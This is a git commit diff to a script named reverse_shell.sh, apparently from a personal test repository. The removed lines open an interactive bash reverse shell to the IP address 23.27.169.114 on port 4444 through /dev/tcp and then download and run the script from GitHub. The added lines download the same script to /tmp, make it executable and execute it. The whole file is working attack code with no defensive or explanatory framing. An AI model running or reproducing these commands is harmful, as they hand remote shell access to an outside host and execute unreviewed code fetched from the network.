a126557c4123b7d60bb9c82f617062e17b5ef222
NarbehJackson <81082128+NarbehJackson@users.noreply.github.com>
2024-10-06 14:12:18 +0330

    Update reverse_shell.sh

--- reverse_shell.sh
+++ reverse_shell.sh
@@ -1,4 +1,7 @@
-bash -i >& /dev/tcp/23.27.169.114/4444 0>&1
-wget https://raw.githubusercontent.com/NarbehJackson/test/refs/heads/main/reverse_shell.sh
-chmod +x reverse_shell.sh
-./reverse_shell.sh
+#!/bin/bash
+# Download the reverse shell script
+wget https://raw.githubusercontent.com/NarbehJackson/test/refs/heads/main/reverse_shell.sh -O /tmp/reverse_shell.sh
+# Make it executable
+chmod +x /tmp/reverse_shell.sh
+# Execute the script
+bash /tmp/reverse_shell.sh
